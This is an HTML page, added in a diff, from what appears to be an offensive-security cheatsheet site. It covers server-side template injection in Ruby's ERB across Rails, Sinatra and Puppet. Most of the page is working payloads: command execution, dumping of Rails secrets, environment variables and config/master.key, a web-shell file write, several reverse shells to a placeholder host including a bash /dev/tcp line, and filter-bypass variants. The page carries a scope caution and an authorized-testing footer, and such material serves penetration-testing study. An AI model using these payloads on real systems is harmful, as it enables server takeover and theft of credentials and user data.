@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ERB (Ruby - Rails, Sinatra, Puppet) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>ERB (Ruby - Rails, Sinatra, Puppet)</h1><p class="cx-lede">SSTI exploitation in ERB - eval and system via Ruby kernel, payloads for Rails admin sinks and Puppet manifests.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.006</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval, RCE, FileRead</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>ERB evaluates arbitrary Ruby. There's no sandbox layer to escape - <code>&lt;%= ... %&gt;</code> is a Ruby expression, full stop. If you can reach ERB rendering with user input, you have RCE.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm ERB
+&lt;%= 7*7 %&gt;                                   # → 49
+&lt;%= File %&gt;                                  # → File (class object)
+
+# RCE - direct
+&lt;%= `id` %&gt;                                  # backtick exec
+&lt;%= system(&#x27;id&#x27;) %&gt;                          # → true (with side-effect to stdout)
+&lt;%= IO.popen(&#x27;id&#x27;).read %&gt;                   # output as string
+
+# File read
+&lt;%= File.read(&#x27;/etc/passwd&#x27;) %&gt;</code></pre></figure>
+<p>Success indicator: command output or file contents in response. ERB SSTI is the most direct of any template engine - minimal indirection between bug and shell.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>Ruby on Rails</strong> - <code>.html.erb</code> views. Sinks are anywhere <code>ERB.new(user_input).result</code> runs, most commonly in admin "email template" or "report builder" features.</li>
+<li><strong>Sinatra</strong> - same ERB usage, smaller app surface.</li>
+<li><strong>Puppet</strong> - <code>.erb</code> files in manifests are templates. RCE through Puppet templates is a serious privesc path on misconfigured Puppet servers.</li>
+<li><strong>Chef</strong> - <code>template</code> resources use ERB. RCE through chef-cookbook templates.</li>
+<li><strong>Vagrant / Logstash</strong> - both bundle ERB for configuration templating.</li>
+<li><strong>Custom Ruby apps</strong> - anything embedding <code>ERB.new</code> with externally-influenced input.</li>
+</ul>
+<h2 id="step-1-confirm-and-orient">Step 1 - Confirm and orient</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= 7*7 %&gt;                       # → 49        confirms template eval
+&lt;%= File %&gt;                      # → File      confirms Ruby-side access (returns class repr)
+&lt;%= RUBY_VERSION %&gt;              # returns Ruby version string - confirms ERB</code></pre></figure>
+<p>If <code>&lt;%= 7*7 %&gt;</code> returns <code>49</code>, you have ERB and full Ruby evaluation. There's no sandbox path to worry about - ERB does not have one. Move to step 2.</p>
+<h2 id="step-2-rce-paths">Step 2 - RCE paths</h2>
+<p>Ruby gives several ways to run commands. Any of them works; the choice depends on what the application does with the output.</p>
+<h3 id="path-a-backticks">Path A - Backticks</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= `id` %&gt;
+&lt;%= `cat /etc/passwd` %&gt;
+&lt;%= `uname -a` %&gt;</code></pre></figure>
+<p>Backticks execute the command and return stdout as a string. The cleanest output path.</p>
+<h3 id="path-b-system">Path B - <code>system</code></h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= system(&#x27;id&#x27;) %&gt;                          # returns true/false (success flag), output goes to stdout
+&lt;%= system(&#x27;id&#x27;, out: $stdout) %&gt;            # explicit</code></pre></figure>
+<p><code>system</code> is useful when you want side effects (e.g. writing a file) and don't care about reflecting output.</p>
+<h3 id="path-c-iopopen">Path C - <code>IO.popen</code></h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= IO.popen(&#x27;id&#x27;).read %&gt;
+&lt;%= IO.popen([&#x27;id&#x27;]).read %&gt;                 # array form - bypasses shell metachar filters</code></pre></figure>
+<h3 id="path-d-processspawn-exec">Path D - <code>Process.spawn</code> / <code>exec</code></h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= Process.spawn(&#x27;id&#x27;) %&gt;                   # returns PID, async
+&lt;%= exec(&#x27;id&#x27;) %&gt;                            # replaces the Ruby process - usually destructive, avoid</code></pre></figure>
+<p><code>Process.spawn</code> is useful when you need to fire-and-forget; <code>exec</code> is rarely what you want because it kills the application worker.</p>
+<h3 id="path-e-x">Path E - <code>%x{...}</code></h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= %x{id} %&gt;</code></pre></figure>
+<p>Equivalent to backticks. Useful when backticks are filtered specifically.</p>
+<h2 id="step-3-loot-before-escalating">Step 3 - Loot before escalating</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Rails environment &amp; config
+&lt;%= Rails.env %&gt;                             # production / development / test
+&lt;%= Rails.application.secrets %&gt;             # full secrets hash
+&lt;%= Rails.application.credentials %&gt;         # Rails 5.2+ credentials
+&lt;%= ENV.to_h %&gt;                              # all environment variables
+
+# Active Record dump
+&lt;%= User.first.to_json %&gt;
+&lt;%= ActiveRecord::Base.connection.execute(&quot;SELECT * FROM users&quot;).to_a %&gt;
+
+# File system
+&lt;%= Dir.entries(&#x27;/&#x27;) %&gt;
+&lt;%= File.read(&#x27;config/master.key&#x27;) %&gt;        # decrypts Rails credentials
+
+# Ruby session
+&lt;%= $LOAD_PATH %&gt;                            # gem paths - reveals app structure
+&lt;%= Gem.loaded_specs.keys %&gt;                 # all loaded gems</code></pre></figure>
+<p><code>Rails.application.secrets</code> on Rails 4.x-5.1 and <code>Rails.application.credentials</code> on 5.2+ contain <code>secret_key_base</code>, database passwords, third-party API keys. Often sufficient on its own.</p>
+<p>For Rails 5.2+, the encrypted credentials at <code>config/credentials.yml.enc</code> are useless without <code>config/master.key</code> (or <code>RAILS_MASTER_KEY</code> env var) - but ERB SSTI can read both:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= File.read(&#x27;config/master.key&#x27;) %&gt;</code></pre></figure>
+<p>Then decrypt offline.</p>
+<h2 id="step-4-file-operations">Step 4 - File operations</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Read
+&lt;%= File.read(&#x27;/etc/passwd&#x27;) %&gt;
+&lt;%= File.readlines(&#x27;/etc/passwd&#x27;) %&gt;
+
+# Write (creates web shell)
+&lt;%= File.write(&#x27;/tmp/x&#x27;, &#x27;&lt;%= `id` %&gt;&#x27;) %&gt;
+
+# Append
+&lt;%= File.open(&#x27;/tmp/x&#x27;, &#x27;a&#x27;) { |f| f.puts(&#x27;append&#x27;) } %&gt;
+
+# Directory enumeration
+&lt;%= Dir.glob(&#x27;/etc/*&#x27;) %&gt;
+&lt;%= Dir.entries(&#x27;/var/www&#x27;) %&gt;</code></pre></figure>
+<h2 id="step-5-reverse-shell">Step 5 - Reverse shell</h2>
+<p>Ruby's socket library is always available:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= require &#x27;socket&#x27;; s=TCPSocket.new(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;); while(cmd=s.gets); IO.popen(cmd,&#x27;r&#x27;){|io| s.print io.read}; end %&gt;</code></pre></figure>
+<p>One-liner with fork to keep the request from blocking:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= Process.fork{require &#x27;socket&#x27;; s=TCPSocket.new(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec &#x27;/bin/sh -i&#x27;} %&gt;</code></pre></figure>
+<p>Standard <code>bash -i</code> via system also works:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;&#x27;) %&gt;</code></pre></figure>
+<h2 id="step-6-puppet-specific-rce">Step 6 - Puppet-specific RCE</h2>
+<p>Puppet manifests use ERB for template rendering. Sinks are anywhere user input flows into a <code>template()</code> call or an <code>.erb</code> file's variable expansion. Example malicious template content (placed via any Puppet-template authoring feature):</p>
+<figure class="cx-code"><figcaption>erb</figcaption><pre><code class="language-erb">&lt;%= `id` %&gt;</code></pre></figure>
+<p>When Puppet compiles, the template renders on the Puppet <em>server</em> - which usually runs as root. Practical sinks: Puppet Enterprise's web console template editor, Hiera data files that include <code>%{...}</code> interpolations, ENC scripts.</p>
+<h2 id="statement-vs-expression-syntax">Statement vs expression syntax</h2>
+<p>ERB has two delimiter pairs:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= expression %&gt;                            # evaluates and inserts result into output
+&lt;% statement %&gt;                              # evaluates but does NOT insert result</code></pre></figure>
+<p>Both execute Ruby. The difference is whether output appears. For RCE, prefer <code>&lt;%=</code> so you can see the result; if <code>&lt;%=</code> is filtered but <code>&lt;%</code> isn't, use:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;% IO.popen(&#x27;id &gt; /tmp/out&#x27;) %&gt;</code></pre></figure>
+<p>Then read <code>/tmp/out</code> via a second request.</p>
+<p>A third form, <code>&lt;%- ... -%&gt;</code>, suppresses leading/trailing whitespace - useful for filter bypass:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%- system(&#x27;id&#x27;) -%&gt;</code></pre></figure>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Method call via send
+&lt;%= &quot;&quot;.send(:eval, &quot;`id`&quot;) %&gt;
+
+# Object.const_get for symbol-based access
+&lt;%= Object.const_get(&#x27;Kernel&#x27;).send(&#x27;`&#x27;, &#x27;id&#x27;) %&gt;
+
+# Through Method binding
+&lt;%= method(:eval).call(&quot;`id`&quot;) %&gt;
+
+# When &lt;%= is filtered
+&lt;% out = `id`; raise out %&gt;                  # exception message contains output</code></pre></figure>
+<p>ERB filters are usually very weak compared to other engines because Ruby is a deeply dynamic language - almost any chain of <code>send</code> / <code>eval</code> / <code>instance_eval</code> / <code>binding.eval</code> reaches command execution.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= 7*7 %&gt;                                   # eval probe
+&lt;%= File %&gt;                                  # ERB-specific (returns &#x27;File&#x27; class repr)
+&lt;%= RUBY_VERSION %&gt;                          # returns Ruby version
+&lt;%= Process.pid %&gt;                           # returns process ID
+&lt;%= Time.now %&gt;                              # returns server time</code></pre></figure>
+<p><code>&lt;%= File %&gt;</code> is the cleanest "is this ERB?" probe - <code>File</code> is a Ruby class name with no analog in EJS/JSP/Razor. Returns the literal text <code>File</code> if ERB is rendering.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>ERB has no sandbox.</strong> Unlike Jinja2, Twig, or Freemarker, there is no "safe mode" for ERB. Ruby applications that template untrusted input are accepting the risk by design. Some apps use <strong>Liquid</strong> instead (Shopify's restricted templating language) - Liquid has its own attack surface but is much more restrictive.</li>
+<li><strong>Rails view templates</strong> rarely take direct user input - the sink is usually a separate "template editor" feature in admin panels. The same template engine renders all views, so SSTI in any admin template gives RCE in the same process that renders public pages.</li>
+<li><strong>Output encoding</strong> - Rails wraps <code>&lt;%= ... %&gt;</code> output with HTML escaping by default. The Ruby code still executes; only the <em>result string</em> is escaped before insertion. So <code>&lt;%= system('id') %&gt;</code> returns <code>true</code> (which renders as <code>true</code>) but <code>id</code> runs unimpeded. Use file-write paths or reverse shells when you can't see output directly.</li>
+<li><strong>Trim modes</strong> - ERB.new accepts <code>&lt;&gt;</code>, <code>-</code>, <code>%</code>, <code>&gt;</code> as trim modes. These affect whitespace handling but not the Ruby execution. They don't impede payloads.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>ERB SSTI is the lowest-friction RCE in this entire section. There's no sandbox, no escape sequence, no class graph to walk - <code>&lt;%= system('id') %&gt;</code> is the whole exploit. Confirm scope before going past <code>7*7</code>. The configuration-dump and file-read demonstrations are sufficient for almost any report.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../../ssrf/chained/index.html">Previous: Chained SSRF</a><a class="cx-next" href="../../ssrf/cheatsheet/index.html">Next: Cheatsheet</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
